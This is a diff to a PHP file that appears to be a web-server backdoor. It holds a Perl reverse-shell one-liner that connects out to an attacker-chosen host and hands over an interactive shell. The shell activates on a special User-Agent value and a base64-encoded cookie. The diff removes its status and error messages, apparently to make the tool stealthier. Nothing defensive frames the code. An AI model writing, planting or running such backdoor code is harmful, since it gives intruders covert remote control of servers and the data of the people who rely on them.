@@ -256,19 +256,16 @@ function reverseConnections($methods, $host, $port, $shell)
     $useShell = null;
 
     if (empty($host)) {
-        echo("\nHost was empty, using: " . $defaultHost . "\n");
         $useHost = $defaultHost;
     } else {
         $useHost = $host;
     }
     if (empty($shell)) {
-        echo("\nShell was empty, using default: " . $defaultShell . "\n");
         $useShell = $defaultShell;
     } else {
         $useShell = $shell;
     }
     if (empty($port)) {
-        echo("\nPort was empty, using default: " . $defaultPort . "\n");
         $usePort = $defaultPort;
     } else {
         $usePort = $port;
@@ -282,7 +279,6 @@ function reverseConnections($methods, $host, $port, $shell)
         "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $useHost, (int)$usePort, $useShell),
     );
     if ($methods == "default"){
-        echo("\nUsing Default value of Bash");
         $useMethod = $comma["bash"];
     }else{
         $useMethod = $methods;
@@ -399,7 +395,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
     } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['r']) {
         $pid = pcntl_fork();
         if ($pid === -1){
-            die("Could not create fork.\n\n");
+            die("\n\n");
         }else {
             pcntl_wait($status);
             $splitter = explode(".", base64_decode($_COOKIE['r']));
